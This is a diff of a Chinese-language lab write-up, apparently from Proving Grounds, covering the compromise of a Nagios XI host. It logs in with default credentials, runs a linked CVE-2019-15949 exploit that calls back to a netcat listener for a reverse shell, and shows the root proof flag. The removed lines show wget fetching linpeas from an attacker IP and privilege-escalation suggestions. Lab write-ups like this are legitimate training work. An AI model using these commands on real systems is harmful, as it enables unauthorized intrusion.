@@ -37,36 +37,17 @@ PORT     STATE SERVICE    REASON  VERSION
 
 透過80port可看到login頁面，利用[帳號nagiosadmin密碼admin](https://support.nagios.com/forum/viewtopic.php?t=544)可登入頁面
 
-下載[edb-49422](https://www.exploit-db.com/exploits/49422)進行攻擊
+下載[CVE-2019–15949](https://github.com/hadrian3689/nagiosxi_5.6.6)
 ```
 ┌──(kali㉿kali)-[~/pgplay]
-└─$ rlwrap -cAr nc -nvlp9001
+└─$ rlwrap -cAr nc -nvlp4444
 
-┌──(kali㉿kali)-[~/pgplay]
-└─$ python3 49422.py https://192.168.211.136 nagiosadmin admin 192.168.45.168 9001
+┌──(kali㉿kali)-[~/pgplay/MACHINE/Monitoring/nagiosxi_5.6.6]
+└─$ python3 exploit.py -t 'http://192.168.191.136' -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.235 -lp 4444
 ```
 
-用`linpeas`
+直接得root
 ```
-www-data@funbox7:/tmp$ wget 192.168.45.177/linpeas.sh
-www-data@funbox7:/tmp$ chmod +x linpeas.sh
-www-data@funbox7:/tmp$ ./linpeas.sh 
-
-╔══════════╣ Executing Linux Exploit Suggester
-╚ https://github.com/mzet-/linux-exploit-suggester 
-...
-[+] [CVE-2021-3156] sudo Baron Samedit
-
-   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-   Exposure: probable
-   Tags: mint=19,[ ubuntu=18|20 ], debian=10
-   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
-
-[+] [CVE-2021-3156] sudo Baron Samedit 2
-
-   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-   Exposure: probable
-   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
-   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
-...
+root@ubuntu:~# cat proof.txt
+d7dea0d6b4e94f056e4b5f46a685e285
 ```
